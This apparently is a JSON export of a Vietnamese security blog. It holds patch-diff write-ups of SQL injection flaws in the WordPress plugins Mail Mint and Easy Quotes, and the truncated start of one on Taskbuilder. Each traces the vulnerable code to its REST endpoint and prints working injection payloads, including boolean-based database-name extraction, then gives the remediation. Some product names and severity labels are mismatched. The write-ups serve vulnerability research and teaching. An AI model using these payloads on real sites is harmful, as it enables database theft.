ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress and Debugging Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;)\u0026#34;; $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;) GROUP BY user_id LIMIT $number OFFSET $offset\u0026#34;; $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.5\u0026quot; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders)\u0026#34;, $keys ); $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026amp; OFFSET (safe with prepare) $final_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\u0026#34;, array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.6\u0026quot; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin.\nK·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:\nretrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php.\nTi·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin.\nH√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php.\nTi·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:\nTa ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress:\nclass ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u0026gt;namespace, // mrm/v1 $this-\u0026gt;rest_base . \u0026#39;/learndash/map\u0026#39;, // contacts/import/learndash/map/ array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::CREATABLE, // POST \u0026#39;callback\u0026#39; =\u0026gt; array( $this-\u0026gt;controller, \u0026#39;map_contacts_with_learndash\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; PermissionManager::current_user_can(\u0026#39;mint_manage_contacts\u0026#39;), // Admin \u0026#39;args\u0026#39; =\u0026gt; array( \u0026#39;selectedCourses\u0026#39; =\u0026gt; array( \u0026#39;description\u0026#39; =\u0026gt; __( \u0026#39;The selected courses from which to import contacts.\u0026#39;, \u0026#39;mrm\u0026#39; ), \u0026#39;required\u0026#39; =\u0026gt; true, \u0026#39;type\u0026#39; =\u0026gt; \u0026#39;array\u0026#39;, \u0026#39;sanitize_callback\u0026#39; =\u0026gt; \u0026#39;rest_sanitize_array\u0026#39;, ) ), // array + required ), ) ); // other logic } // other logic } Lu·ªìng g·ªçi h√†m:\nPOST /wp-json/mrm/v1/contacts/import/learndash/map ƒë∆∞·ª£c g·ª≠i t·ªõi REST API c√πng tham s·ªë b·∫Øt bu·ªôc selectedCourses. map_contacts_with_learndash(WP_REST_Request $request) l√† callback ƒë∆∞·ª£c g·ªçi: Nh·∫≠n $request l√†m tham s·ªë ƒë·∫ßu v√†o. L·∫•y c√°c tham s·ªë c·ªßa $request chuy·ªÉn th√†nh m·∫£ng $params Callback g·ªçi retrieve_contacts_associated_with_learndash() v·ªõi ƒë·ªëi s·ªë l√† $params. retrieve_contacts_associated_with_learndash() g·ªçi get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0): $courses = $params['selectedCourses'], $number = 5 $keys l√† m·ªôt m·∫£ng ƒë∆∞·ª£c t·∫°o ra b·∫±ng c√°ch l·∫•y t·∫•t c·∫£ gi√° tr·ªã value trong $courses, sau ƒë√≥ gh√©p chu·ªói theo m·∫´u course_{COURSE_ID}_access_from Tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query, m·∫£ng $keys ƒë∆∞·ª£c n·ªëi th√†nh m·ªôt chu·ªói b·∫±ng h√†m implode(). N·∫øu $keys ch·ªâ c√≥ m·ªôt ph·∫ßn t·ª≠, k·∫øt qu·∫£ c·ªßa implode() ch√≠nh l√† gi√° tr·ªã chu·ªói c·ªßa ph·∫ßn t·ª≠ ƒë√≥. Th·ª±c thi query, tr·∫£ v·ªÅ JSON ch·ª©a formatted_users + total_users Exploit Sau khi ph√¢n t√≠ch, ta th·∫•y tham s·ªë selectedCourses ƒë∆∞·ª£c x·ª≠ l√Ω qua nhi·ªÅu logic tr∆∞·ªõc khi truy·ªÅn v√†o query ch·ª©a SQLi, quan tr·ªçng ta v·∫´n ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa key value.\nPOST request qua BurpSuite:\nTa g·ª≠i request v·ªõi m·ªôt key duy nh·∫•t =\u0026gt; d·ªÖ d√†ng ki·ªÉm so√°t c√¢u query\nKhi ƒë√≥, c√¢u query tr·ªü th√†nh\nSELECT user_id FROM wp_usermeta WHERE meta_key IN (\u0026#39;course_abc\u0026#39;) OR 1=1 -- _access_from\u0026#39;) GROUP BY user_id LIMIT 5 OFFSET 0 ') tho√°t kh·ªèi IN 1=1 lu√¥n ƒë√∫ng =\u0026gt; tr·∫£ v·ªÅ t√¢t c·∫£ user_id trong wp_usermeta ƒêo·∫°n code c√≤n l·∫°i trong get_wp_users_by_learndash_with_limit_offset s·∫Ω truy v·∫•n meta th√¥ng tin c·ªßa t·∫•t c·∫£ user tr·∫£ v·ªÅ:\n$formatted_users = array_map( function ($user) { $user-\u0026gt;usermeta = array_map( function ($user_data) { return reset($user_data); }, get_user_meta($user-\u0026gt;ID) ); return $user; }, $contacts ); Conclusion L·ªó h·ªïng CVE-2025-58604 trong plugin WordPress Mail Mint tr∆∞·ªõc phi√™n b·∫£n 1.18.6 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Mail Mint Plugin \u0026lt;= 1.18.5 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-04-cve-2025-58604/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMail Mint\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.18.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-58604\"\u003eCVE-2025-58604\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mail-mint/\"\u003eWordPress Mail Mint Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.18.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Low (7.6)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMail Mint\u003c/strong\u003e:  v1.18.5(vul) v√† v1.18.6(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-58604"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nC√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.3\u0026rdquo; }\nHow it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±.\nget_family_data() l√† h√†m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php 